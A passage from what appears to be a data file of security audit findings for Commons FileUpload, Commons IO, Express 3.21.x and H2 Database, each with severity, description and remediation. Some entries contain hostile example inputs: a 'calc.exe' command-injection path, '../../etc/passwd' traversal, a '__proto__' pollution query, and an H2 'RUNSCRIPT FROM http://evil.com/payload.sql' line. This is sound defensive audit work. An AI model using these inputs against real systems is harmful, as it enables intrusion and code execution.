`hasNext()` (lines 1155–1168) contain no analogous check. An attacker sending a request with unlimited multipart parts to a server using the streaming iterator can exhaust memory or processing resources.\n\n**Context**: CVE-2023-24998 addressed an older variant of this DoS (unbounded field parsing). The `fileCountMax` field and `FileCountLimitExceededException` were added as the fix, but the fix was only applied to one of the two API paths.\n\n**Impact**: An attacker can submit a multipart request with an arbitrarily large number of parts to force server-side resource exhaustion if the application uses `getItemIterator()` / `FileItemIterator`.\n\n**Recommendation**: Apply the `fileCountMax` check inside `FileItemIteratorImpl.findNextItem()` (or `hasNext()`) with a counter that increments on each emitted item, mirroring the `parseRequest()` logic.\n\n---",affected_files:null,exploitation:null,remediation:null,adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:null,cve_ids:null,hackerone_id:null},
  {id:"53e53e45-c0dd-4406-85cb-6f67c16efd71",title:"No Path Traversal Sanitization on Filenames (Design Gap)",severity:"LOW",project:"Commons FileUpload 1.5.x (nes-1.5.x)",category:"Our Findings",status:"Confirmed",source_badge:null,description:"[CFU-002] CWE-22 (Upstream-Inherited)\n\n**Severity**: Low  \n**CWE**: CWE-22 (Path Traversal)  \n**Classification**: Upstream-Inherited  \n\n**Description**:  \n`Streams.checkFileName()` (the only filename validation applied) exclusively checks for NUL (`\\\\u0000`) bytes. Path traversal sequences such as `../`, absolute paths, Windows-style `..\\\\\\\\`, or Unicode-encoded variants are **not** stripped or rejected. This is documented behavior — the library intentionally delegates path handling to the application — but no warnings are surfaced to callers and the API design makes it easy for developers to misuse.\n\n**Evidence**:  \n`Streams.java` lines 172–191:\n```java\npublic static String checkFileName(String fileName) {\n    if (fileName != null  &&  fileName.indexOf('\\\\u0000') != -1) {\n        // only NUL check\n        throw new InvalidFileNameException(fileName, \"Invalid file name: \" + sb);\n    }\n    return fileName;\n}\n```\n\n`DiskFileItem.getName()` calls only `Streams.checkFileName(fileName)`. No normalization is performed. If calling code does `new File(uploadDir, item.getName())`, a malicious filename like `../../etc/passwd` will resolve outside the intended directory.\n\n**Impact**: Low at the library level — the library is a parsing aid and does not write files itself. However, many downstream applications incorrectly assume filenames are safe to use directly as file system paths. The lack of any traversal check (or even Javadoc warning beyond NUL) is a latent risk.\n\n**Recommendation**: Add `../` and absolute-path detection to `checkFileName()` (or a new `sanitizeFileName()` method), or add prominent Javadoc warnings on all `getName()` methods that callers MUST sanitize filenames before using them in file system operations.\n\n---",affected_files:null,exploitation:null,remediation:null,adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:null,cve_ids:null,hackerone_id:null},
  {id:"e05ce12a-85ed-48a5-9e5e-fa3c8fd055f0",title:"`DiskFileItem.toString()` Exposes Temp File Path",severity:"LOW",project:"Commons FileUpload 1.5.x (nes-1.5.x)",category:"Our Findings",status:"Confirmed",source_badge:null,description:"[CFU-003] CWE-200 (Upstream-Inherited)\n\n**Severity**: Low  \n**CWE**: CWE-200 (Information Exposure)  \n**Classification**: Upstream-Inherited  \n\n**Description**:  \n`DiskFileItem.toString()` returns a string that includes the full temporary file path via `getStoreLocation()`:\n\n```java\n// DiskFileItem.java line 606-609\nreturn format(\"name=%s, StoreLocation=%s, size=%s bytes, isFormField=%s, FieldName=%s\",\n              getName(), getStoreLocation(), Long.valueOf(getSize()),\n              Boolean.valueOf(isFormField()), getFieldName());\n```\n\nIf this string is logged, rendered in an error page, or returned via an API response, it discloses the server's temp directory path and temp file naming scheme. The UID embedded in temp filenames is a UUID, which is not predictable, but the base directory and naming pattern (`upload_<UUID>_<counter>.tmp`) are exposed.\n\n**Impact**: Low. Exposes server-side filesystem layout. Does not directly enable further exploitation on its own.\n\n**Recommendation**: Override `toString()` to omit `StoreLocation`, or redact it (e.g., show only the filename without parent path).\n\n---",affected_files:null,exploitation:null,remediation:null,adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:null,cve_ids:null,hackerone_id:null},
  {id:"ce8942a1-be55-4052-abfb-cdd5700559af",title:"Default Limits Off by Default (`sizeMax`, `fileSizeMax`, `fileCountMax`)",severity:"LOW",project:"Commons FileUpload 1.5.x (nes-1.5.x)",category:"Our Findings",status:"Confirmed",source_badge:null,description:"[CFU-004] CWE-400 (Upstream-Inherited)\n\n**Severity**: Low  \n**CWE**: CWE-400 (Uncontrolled Resource Consumption)  \n**Classification**: Upstream-Inherited  \n\n**Description**:  \nThree critical DoS-limiting fields default to `-1` (no limit) in `FileUploadBase`:\n\n```java\n// FileUploadBase.java lines 167-179\nprivate long sizeMax = -1;\nprivate long fileSizeMax = -1;\nprivate long fileCountMax = -1;\n```\n\nApplications that do not explicitly configure these fields receive no protection against oversized uploads or upload floods. NES did add `partHeaderSizeMax` defaulting to 512 bytes (a positive security improvement — see NES Patch Assessment below), but the three primary limits remain opt-in.\n\n**NES Patch Assessment**: The NES-introduced `partHeaderSizeMax` (default 512 bytes, introduced in nes-v1.5.2 commit `260cdab`) is a genuine security improvement. Prior to this patch, the only header size protection was the deprecated `HEADER_PART_SIZE_MAX` constant (10240 bytes) which was marked as unused. The new default of 512 bytes is appropriately conservative and enforced in `MultipartStream.readHeaders()`.\n\n**Impact**: Low severity at the library level — the library provides the setter methods. However, the lack of safe defaults means uninformed application developers may ship with no upload limits.\n\n**Recommendation**: Consider documenting recommended minimum values (e.g., 10 MB for `sizeMax`, 10 MB for `fileSizeMax`, 1000 for `fileCountMax`) in Javadoc or README.\n\n---",affected_files:null,exploitation:null,remediation:null,adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:null,cve_ids:null,hackerone_id:null},
  // === Commons IO 2.11.x (nes-2.11.x) ===
  {id:"769fe1a3-2575-4f08-b120-94190c3b481e",title:"ClassLoaderObjectInputStream: No Deserialization Allowlist",severity:"LOW",project:"Commons IO 2.11.x (nes-2.11.x)",category:"Our Findings",status:"Confirmed",source_badge:null,description:"[CIO-002] CWE-502 (Upstream-Inherited)\n\n**Severity**: Low  \n**CWE**: CWE-502 (Deserialization of Untrusted Data)  \n**Classification**: Upstream-Inherited  \n**File**: `src/main/java/org/apache/commons/io/input/ClassLoaderObjectInputStream.java`  \n\n**Description**:  \n`ClassLoaderObjectInputStream` extends `ObjectInputStream` to resolve classes via a caller-supplied `ClassLoader` rather than the default system classloader. It overrides `resolveClass()` and `resolveProxyClass()` but applies **no allowlist or denylist** on what classes may be deserialized.\n\n```java\n@Override\nprotected Class<?> resolveClass(final ObjectStreamClass objectStreamClass)\n        throws IOException, ClassNotFoundException {\n    try {\n        return Class.forName(objectStreamClass.getName(), false, classLoader);\n    } catch (final ClassNotFoundException cnfe) {\n        return super.resolveClass(objectStreamClass);\n    }\n}\n```\n\nIf an application passes untrusted data to this stream with a broad `ClassLoader`, any class reachable in that loader can be instantiated during deserialization, potentially triggering gadget chains.\n\n**Contrast with `ValidatingObjectInputStream`**: The library also ships `ValidatingObjectInputStream`, which enforces an explicit allowlist. Applications that need deserialization from untrusted sources should use `ValidatingObjectInputStream` instead.\n\n**Severity rationale**: Rated Low (not Medium/High) because:\n- The caller must explicitly construct the stream with a ClassLoader — this is not called implicitly\n- The vulnerability requires untrusted serialized data reaching the stream, which is a caller-side concern\n- The class is documented as a utility for dynamic container environments\n- The recommended secure alternative (`ValidatingObjectInputStream`) is provided in the same library\n\n**Recommendation**: Add Javadoc warning that this class is not safe for untrusted input and recommending `ValidatingObjectInputStream`.\n\n---",affected_files:null,exploitation:null,remediation:null,adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:null,cve_ids:null,hackerone_id:null},
  {id:"1ff2b7af-5dbc-417d-b877-f153d71d14c2",title:"FileSystemUtils.freeSpaceWindows: Partial Windows Command Injection Exposure",severity:"LOW",project:"Commons IO 2.11.x (nes-2.11.x)",category:"Our Findings",status:"Confirmed",source_badge:null,description:"[CIO-003] CWE-78 (Upstream-Inherited)\n\n**Severity**: Low  \n**CWE**: CWE-78 (OS Command Injection)  \n**Classification**: Upstream-Inherited  \n**File**: `src/main/java/org/apache/commons/io/FileSystemUtils.java`  \n\n**Description**:  \n`FileSystemUtils.freeSpaceWindows(String path, Duration timeout)` constructs a Windows shell command string by concatenating the normalized user-controlled path:\n\n```java\nString normPath = FilenameUtils.normalize(path, false);\n// ...\nif (!normPath.isEmpty() && normPath.charAt(0) != '\"') {\n    normPath = \"\\\\\"\" + normPath + \"\\\\\"\";\n}\nfinal String[] cmdAttribs = {\"cmd.exe\", \"/C\", \"dir /a /-c \" + normPath};\n```\n\n`FilenameUtils.normalize()` only resolves `.`/`..` and normalizes separators. It does **not** strip Windows shell metacharacters (`\"`, `&`, `|`, `>`, etc.). When the normalized path is embedded in the third element of the `cmd.exe /C` command string, `cmd.exe` interprets that string through the shell. A crafted path containing an embedded `\"` can break out of quoting and append additional shell commands:\n\n- Input path: `C:\\\\foo\"&&calc.exe`\n- After normalize: `C:/foo\"&&calc.exe`\n- After quote-wrapping: `\"C:/foo\"&&calc.exe\"`\n- cmd.exe sees: `dir /a /-c \"C:/foo\" && calc.exe \"`\n\n**Severity rationale**: Rated Low (not Medium) because:\n- The **entire `FileSystemUtils` class is `@Deprecated` since Apache Commons IO 2.6** and explicitly recommends `java.nio.file.FileStore` as the replacement\n- The class-level Javadoc says \"deprecated without replacement. Use equivalent methods in `java.nio.file.FileStore` instead\"\n- The public API methods (`freeSpace`, `freeSpaceKb`) are all individually deprecated with `@Deprecated`\n- Exploitation requires passing an attacker-controlled path to an explicitly deprecated API\n- The underlying call to `Runtime.getRuntime().exec(String[])` with the array form does invoke OS exec directly, but `cmd.exe` itself re-parses the `/C` argument string\n\n**Recommendation**: The class should remain deprecated with no new usage encouraged. Optionally add an explicit guard to reject paths containing characters not valid in Windows file paths (e.g., `\"`, `|`, `>`, `<`, `&`).\n\n---",affected_files:null,exploitation:null,remediation:null,adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:null,cve_ids:null,hackerone_id:null},
  {id:"62c36849-5508-4e06-b165-526d07a92611",title:"Path Information Exposure in Exception Messages",severity:"INFO",project:"Commons IO 2.11.x (nes-2.11.x)",category:"Our Findings",status:"Confirmed",source_badge:null,description:"[CIO-004] CWE-200 (Upstream-Inherited)\n\n**Severity**: Informational  \n**CWE**: CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)  \n**Classification**: Upstream-Inherited  \n**File**: `src/main/java/org/apache/commons/io/FileUtils.java` and others  \n\n**Description**:  \nSeveral `IOException` messages in `FileUtils` and `FileSystemUtils` embed raw file system paths that may reflect internal directory structure:\n\n```java\nthrow new IOException(\"Cannot delete file: \" + file, e);\nthrow new FileNotFoundException(\"File does not exist: \" + file);\nthrow new IOException(\"Cannot create directory '\" + directory + \"'.\");\nthrow new IOException(\"Cannot move directory: \" + srcDir + \" to a subdirectory of itself: \" + destDir);\nthrow new FileNotFoundException(\"The source \" + sourceFile + \" does not exist\");\n```\n\nIf these exceptions are propagated to end users (e.g., via HTTP error responses or logs visible to attackers), they may expose internal filesystem layout.\n\n**Severity rationale**: Informational because:\n- This is standard Java IO library behavior; suppressing paths from IO exceptions would make debugging impossible\n- Responsibility for sanitizing exception messages before displaying to users lies with calling applications\n- No path is exposed unless the exception propagates uncaught\n\n---",affected_files:null,exploitation:null,remediation:null,adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:null,cve_ids:null,hackerone_id:null},
  {id:"a252ca81-63f7-4416-9ea3-cc3205c7f552",title:"CVE-2024-47554: ReDoS in XmlStreamReader ENCODING_PATTERN (Patched)",severity:"INFO",project:"Commons IO 2.11.x (nes-2.11.x)",category:"Our Findings",status:"Confirmed",source_badge:null,description:"[CIO-001] CWE-1333 (NES-Introduced (Fix))\n\n**Severity**: Informational (patched by NES)  \n**CWE**: CWE-1333 (Inefficient Regular Expression Complexity)  \n**Classification**: NES-Introduced (Fix)  \n**File**: `src/main/java/org/apache/commons/io/input/XmlStreamReader.java`  \n\n**Description**:  \nCVE-2024-47554 was a ReDoS vulnerability in `XmlStreamReader.ENCODING_PATTERN`. The original pattern:\n\n```java\n// VULNERABLE (pre-patch):\nPattern.compile(\"<\\\\\\\\?xml.*encoding[\\\\\\\\s]*=[\\\\\\\\s]*((?:\\\\\".[^\\\\\"]*\\\\\")|(?:'.[^']*'))\", Pattern.MULTILINE);\n```\n\nThis pattern used `.*` combined with backtracking character classes that could cause catastrophic backtracking on adversarial input (e.g., a crafted `<?xml` prolog with many characters before `encoding=`).\n\n**NES Fix** (commits `1259ac8f` and `3f62fc01`): The pattern was replaced with a tightly structured version that anchors to the start of a line (`^`), requires the `version` attribute before `encoding`, and uses bounded character classes with no unbounded wildcards:\n\n```java\n// PATCHED:\npublic static final Pattern ENCODING_PATTERN = Pattern.compile(\n        \"^<\\\\\\\\?xml\\\\\\\\s+\"\n        + \"version\\\\\\\\s*=\\\\\\\\s*(?:(?:\\\\\"1\\\\\\\\.[0-9]+\\\\\")|(?:'1.[0-9]+'))\\\\\\\\s+\"\n        + \"encoding\\\\\\\\s*=\\\\\\\\s*((?:\\\\\"[A-Za-z]([A-Za-z0-9\\\\\\\\._]|-)*\\\\\")|(?:'[A-Za-z]([A-Za-z0-9\\\\\\\\\\\\\\\\._]|-)*'))\",\n        Pattern.MULTILINE);\n```\n\n**Status**: FIXED. The NES patch correctly eliminates the catastrophic backtracking risk.\n\n---",affected_files:null,exploitation:null,remediation:null,adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:null,cve_ids:null,hackerone_id:null},
  {id:"fed21764-7d72-407f-b234-a14cdd1103f8",title:"ENCODING_PATTERN Regex Minor Inconsistency (single-quote branch)",severity:"INFO",project:"Commons IO 2.11.x (nes-2.11.x)",category:"Our Findings",status:"Confirmed",source_badge:null,description:"[CIO-005] CWE-1333 (NES-Introduced)\n\n**Severity**: Informational  \n**CWE**: CWE-1333 (Inefficient Regular Expression Complexity)  \n**Classification**: NES-Introduced  \n**File**: `src/main/java/org/apache/commons/io/input/XmlStreamReader.java`  \n\n**Description**:  \nThe NES-patched `ENCODING_PATTERN` contains two minor inconsistencies between the double-quote and single-quote branches:\n\n1. **Version matching dot not escaped in single-quote branch**:\n   - Double-quote: `\"1\\\\\\\\.[0-9]+\"` → regex `1\\\\.[0-9]+` (literal dot)\n   - Single-quote: `'1.[0-9]+'` → regex `1.[0-9]+` (any character instead of literal dot)\n   - Impact: `version='1X0'` would match the single-quote version branch, which is more permissive than the spec requires but does not enable any bypass of security controls.\n\n2. **Encoding character class differs between branches**:\n   - Double-quote group: `[A-Za-z0-9\\\\\\\\._]` → allows letter, digit, backslash, dot, underscore\n   - Single-quote group: `[A-Za-z0-9\\\\\\\\\\\\\\\\._]` → allows letter, digit, two literal backslashes, dot, underscore\n   - Since XML encoding names cannot legally contain backslashes (per RFC/XML spec), both branches are more permissive than necessary, but neither creates a security bypass.\n\n**Severity rationale**: Informational only — these inconsistencies do not allow bypassing the ReDoS fix or injecting arbitrary encoding values that would affect security.\n\n---",affected_files:null,exploitation:null,remediation:null,adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:null,cve_ids:null,hackerone_id:null},

  {id:"a0000001-0003-4000-8000-000000000003",title:"body-parser 1.13.3 Denial of Service",severity:"HIGH",project:"Express 3.21.x (nes-3.21.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"The extended URL-encoded parser configures qs with depth: Infinity, allowing deeply nested query structures combined with qs 4.0.0 arrayLimit bypass for excessive memory allocation.",affected_files:"node_modules/body-parser",exploitation:"POST request with Content-Type: application/x-www-form-urlencoded containing deeply nested bracket notation.",remediation:"Update body-parser to >= 1.20.3.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"3.21.x",cve_ids:"CVE-2024-45590",hackerone_id:null},
  {id:"a0000001-0002-4000-8000-000000000002",title:"qs 4.0.0 Multiple Prototype Pollution Vulnerabilities",severity:"HIGH",project:"Express 3.21.x (nes-3.21.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"qs 4.0.0 is used by connect.query() (applied to ALL requests by default) and body-parser. It has known prototype pollution protection bypasses and arrayLimit bypass enabling memory exhaustion DoS.",affected_files:"node_modules/qs",exploitation:"Query string: GET /?a[__proto__]=polluted or crafted bracket notation.",remediation:"Update qs to >= 6.14.1.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"3.21.x",cve_ids:"GHSA-gqgv-6jq5-jjj9,GHSA-hrpp-h998-j3pp,GHSA-6rw7-vpxm-498p",hackerone_id:null},

  {id:"a0000001-0004-4000-8000-000000000004",title:"connect fresh 0.3.0 ReDoS",severity:"HIGH",project:"Express 3.21.x (nes-3.21.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"Connect bundles fresh 0.3.0 which has a Regular Expression Denial of Service vulnerability. The vulnerable regex processes If-None-Match and If-Modified-Since headers.",affected_files:"node_modules/connect/node_modules/fresh",exploitation:"Send request with crafted If-None-Match or If-Modified-Since header designed to trigger catastrophic backtracking.",remediation:"Update fresh in connect dependency tree to >= 0.5.2.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"3.21.x",cve_ids:"CVE-2017-16119",hackerone_id:null},

  {id:"a0000001-0007-4000-8000-000000000007",title:"View Dynamic require() via Extension",severity:"MEDIUM",project:"Express 3.21.x (nes-3.21.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"The View constructor dynamically requires a template engine module based on the file extension via require(ext.slice(1)).__express. If attacker controls the view name extension, they can trigger require() of arbitrary installed npm modules.",affected_files:"lib/view.js:43",exploitation:"Same as path traversal - requires user input flowing to res.render('foo.malicious-module').",remediation:"Never pass user-controlled input to res.render().",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"3.21.x",cve_ids:null,hackerone_id:null},
  {id:"a0000001-0008-4000-8000-000000000008",title:"mime 1.3.4 ReDoS",severity:"MEDIUM",project:"Express 3.21.x (nes-3.21.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"mime < 1.4.1 has ReDoS when looking up MIME types from file extensions. Used by send and serve-static for content-type determination.",affected_files:"node_modules/mime",exploitation:"Request a file with a crafted extension that triggers regex backtracking in MIME type lookup.",remediation:"Update mime to >= 1.4.1 throughout dependency tree.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"3.21.x",cve_ids:"GHSA-wrvr-8mpx-r7pp",hackerone_id:null},
  {id:"a0000001-0006-4000-8000-000000000006",title:"View Path Traversal via res.render()",severity:"MEDIUM",project:"Express 3.21.x (nes-3.21.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"View.prototype.lookup() joins the root views directory with the view name using path.join() which resolves .. sequences. If user input flows into res.render(userInput), an attacker can traverse outside the views directory.",affected_files:"lib/view.js:55-65",exploitation:"Application code res.render(req.params.template) allows attacker to send ../../etc/passwd as template param.",remediation:"Never pass user-controlled input to res.render(). Validate view names against an allowlist.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"3.21.x",cve_ids:null,hackerone_id:null},
  {id:"a0000001-0009-4000-8000-000000000009",title:"negotiator 0.5.3 ReDoS via accepts",severity:"MEDIUM",project:"Express 3.21.x (nes-3.21.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"negotiator < 0.6.1 has ReDoS when parsing Accept headers. Used in connect compression middleware and Express req.accepts().",affected_files:"node_modules/negotiator",exploitation:"Send request with crafted Accept header with many entries and quality values.",remediation:"Update negotiator to >= 0.6.1 via accepts update.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"3.21.x",cve_ids:"GHSA-7mc5-chhp-fmc3",hackerone_id:null},
  {id:"a0000001-0010-4000-8000-000000000010",title:"debug 2.6.9 ReDoS",severity:"MEDIUM",project:"Express 3.21.x (nes-3.21.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"The debug module has inefficient regex complexity. When DEBUG environment variable is set (common in development), processing debug output with crafted strings can cause DoS.",affected_files:"node_modules/debug",exploitation:"Only exploitable when DEBUG environment variable is enabled. Requires attacker input reaching debug log output.",remediation:"Update debug to >= 3.1.0 throughout dependency tree.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"3.21.x",cve_ids:"GHSA-9vvw-cc9w-f27h",hackerone_id:null},

  {id:"a0000001-0013-4000-8000-000000000013",title:"req.is() NES Patch Whitespace Handling Gap",severity:"MEDIUM",project:"Express 3.21.x (nes-3.21.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"The NES Content-Type check patch changed req.is() to strict equality without trimming whitespace. Content-Type with space before semicolon produces trailing space, causing false negative on strict comparison. This is a regression introduced by the NES patch.",affected_files:"lib/request.js:331",exploitation:"An attacker sending Content-Type: application/json ; charset=utf-8 could bypass req.is('json') checks.",remediation:"Add .trim() to the Content-Type split result before comparison.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"3.21.x",cve_ids:null,hackerone_id:null},
  {id:"a0000001-0014-4000-8000-000000000014",title:"res.redirect() Location Header Not URL-Encoded",severity:"MEDIUM",project:"Express 3.21.x (nes-3.21.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"The NES XSS fix for res.redirect() removed the <a href> tag from the HTML body but did NOT add encodeUrl() sanitization on the Location header, unlike the upstream Express 4.20.0 fix. Incomplete NES backport.",affected_files:"lib/response.js:795-796",exploitation:"If application passes user input to res.redirect(), unencoded special characters could be injected into the Location header.",remediation:"Add encodeUrl() call on the Location header value.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"3.21.x",cve_ids:null,hackerone_id:null},
  {id:"a0000001-0015-4000-8000-000000000015",title:"connect cookie 0.1.3 Out-of-Bounds Characters",severity:"MEDIUM",project:"Express 3.21.x (nes-3.21.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"While NES updated Express's direct cookie to 0.7.2, connect's bundled cookie 0.1.3 accepts cookie names, paths, and domains containing out-of-bounds characters. Used by connect's cookieParser, session, and csurf middleware.",affected_files:"node_modules/connect/node_modules/cookie",exploitation:"Crafted cookie headers with invalid characters could bypass security checks in session and CSRF middleware.",remediation:"Update cookie in connect dependency tree to >= 0.7.0.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"3.21.x",cve_ids:"GHSA-pxg6-pf52-xh8x",hackerone_id:null},
  {id:"a0000001-0018-4000-8000-000000000018",title:"Session Fixation via connect.session() Defaults",severity:"MEDIUM",project:"Express 3.21.x (nes-3.21.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"The connect session middleware defaults to saveUninitialized: true and resave: true. This saves brand-new sessions before any data is written, enabling session fixation across the authentication boundary.",affected_files:"node_modules/connect/lib/middleware/session.js:28-33",exploitation:"Attacker sets a session cookie on victim before authentication; session ID is preserved across authentication.",remediation:"Set saveUninitialized: false when configuring session middleware.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"3.21.x",cve_ids:null,hackerone_id:null},
  {id:"a0000001-0019-4000-8000-000000000019",title:"Open Redirect via res.redirect(back)",severity:"MEDIUM",project:"Express 3.21.x (nes-3.21.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"When res.redirect('back') is used, the target comes from the attacker-controlled Referer header. NES's open redirect fix only applies to relative URLs starting with . -- the back redirect path bypasses it entirely.",affected_files:"lib/response.js:736",exploitation:"Attacker sets Referer: https://evil.com and server redirects user there.",remediation:"Validate the Referer header against an allowlist of trusted domains.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"3.21.x",cve_ids:null,hackerone_id:null},
  {id:"a0000001-0020-4000-8000-000000000020",title:"Multipart Temp File Disk Exhaustion (DoS)",severity:"MEDIUM",project:"Express 3.21.x (nes-3.21.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"The multipart middleware writes uploaded files to os.tmpDir() with a default 100MB limit per request. These files are never automatically cleaned up. Repeated uploads can exhaust disk space.",affected_files:"node_modules/connect/lib/middleware/multipart.js:83-165",exploitation:"Repeated file uploads to exhaust disk space on the server.",remediation:"Implement file cleanup strategy or use a separate upload handler with cleanup.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"3.21.x",cve_ids:null,hackerone_id:null},
  {id:"a0000001-0021-4000-8000-000000000021",title:"Method Override on All HTTP Verbs",severity:"MEDIUM",project:"Express 3.21.x (nes-3.21.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"The method override middleware passes methods: null, disabling the default restriction to override only POST requests. X-HTTP-Method-Override: DELETE works on GET, HEAD, and other methods.",affected_files:"node_modules/connect/lib/middleware/methodOverride.js:27",exploitation:"Bypass CSRF protections by sending GET request with X-HTTP-Method-Override: POST.",remediation:"Configure methodOverride to only accept overrides on POST requests.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"3.21.x",cve_ids:null,hackerone_id:null},
  {id:"a0000001-0022-4000-8000-000000000022",title:"res.cookie() Silently Overwrites Previous Set-Cookie Headers",severity:"MEDIUM",project:"Express 3.21.x (nes-3.21.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"res.cookie() calls setHeader() which overwrites any previously set Set-Cookie header rather than appending. If an app sets a security-critical cookie then sets a second cookie, the first is silently dropped.",affected_files:"lib/response.js:696",exploitation:"Security-critical cookies can be silently dropped when multiple cookies are set in same response.",remediation:"Use res.append() pattern or track cookies manually.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"3.21.x",cve_ids:null,hackerone_id:null},
  {id:"a0000001-0023-4000-8000-000000000023",title:"req.host Does Not Parse Comma-Separated X-Forwarded-Host",severity:"MEDIUM",project:"Express 3.21.x (nes-3.21.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"When trust proxy is enabled, req.host uses the raw X-Forwarded-Host header. If a proxy chain sets X-Forwarded-Host: evil.com, real-proxy.com, Express 3.x returns the entire comma-separated string.",affected_files:"lib/request.js:495-514",exploitation:"With trust proxy enabled: X-Forwarded-Host: evil.com, legitimate.com corrupts host-based routing.",remediation:"Parse X-Forwarded-Host to extract only the first value, matching Express 4.17+ behavior.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"3.21.x",cve_ids:null,hackerone_id:null},
  {id:"a0000001-0024-4000-8000-000000000024",title:"pathRegexp Array Input Allows Regex Injection (ReDoS)",severity:"MEDIUM",project:"Express 3.21.x (nes-3.21.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"When pathRegexp() receives an array path, elements are joined with | and embedded into a regex without escaping. Attacker can inject catastrophic backtracking patterns if user-controlled input reaches route path arrays.",affected_files:"lib/utils.js:313",exploitation:"pathRegexp([(a+)+], []) produces catastrophic backtracking regex; 'a'.repeat(25) + 'X' takes 835ms.",remediation:"Escape regex metacharacters in array path elements before joining.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"3.21.x",cve_ids:null,hackerone_id:null},
  {id:"a0000001-0016-4000-8000-000000000016",title:"basic-auth-connect Timing Attack",severity:"LOW",project:"Express 3.21.x (nes-3.21.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"Uses time-unsafe string comparison for HTTP Basic Auth credentials.",affected_files:"node_modules/basic-auth-connect",exploitation:"Timing analysis of authentication responses to recover credentials.",remediation:"Update basic-auth-connect to use timing-safe comparison.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"3.21.x",cve_ids:"GHSA-7p89-p6hx-q4fw",hackerone_id:null},
  {id:"a0000001-0017-4000-8000-000000000017",title:"utils-merge Unsafe Property Copy",severity:"LOW",project:"Express 3.21.x (nes-3.21.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"The merge function uses for...in without filtering __proto__ or constructor. Used in app.render() for merging template options.",affected_files:"node_modules/utils-merge",exploitation:"Requires user input flowing through res.render(view, userControlledOptions).",remediation:"Use a merge function that filters dangerous keys.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"3.21.x",cve_ids:null,hackerone_id:null},
  {id:"a0000001-0025-4000-8000-000000000025",title:"Information Disclosure via Template Locals",severity:"LOW",project:"Express 3.21.x (nes-3.21.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"this.locals.settings = this.settings exposes all Express configuration (trust proxy settings, view engine, views path, environment mode) to template engines. Exploitable if SSTI vulnerability exists.",affected_files:"lib/application.js:115",exploitation:"Requires an existing Server-Side Template Injection vulnerability in the application.",remediation:"Remove settings from locals or use a filtered subset.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"3.21.x",cve_ids:null,hackerone_id:null},

  // === H2 Database 2.1.x (nes-2.1.x) ===
  {id:"a0000005-0004-4000-8000-000000000004",title:"RUNSCRIPT FROM Enables Remote Script Loading",severity:"HIGH",project:"H2 Database 2.1.x (nes-2.1.x)",category:"code_review",status:"confirmed",source_badge:"code-review",description:"RUNSCRIPT FROM http://evil.com/payload.sql or RUNSCRIPT FROM file:///etc/passwd loads and executes arbitrary SQL scripts from remote URLs or local files. The h2.scriptDirectory property defaults to empty.",affected_files:"h2/src/main/org/h2/command/dml/RunScriptCommand.java:46-89, h2/src/main/org/h2/command/dml/ScriptBase.java:85-94",exploitation:"Chained with INIT parameter or direct SQL execution by admin users.",remediation:"Restrict RUNSCRIPT FROM to a specific directory via h2.scriptDirectory. Block URL-based scripts.",adversarial_verdict:null,reproduction_path:null,fix_status:null,affected_versions:"2.1.x",cve_ids:null,hackerone_id:null},
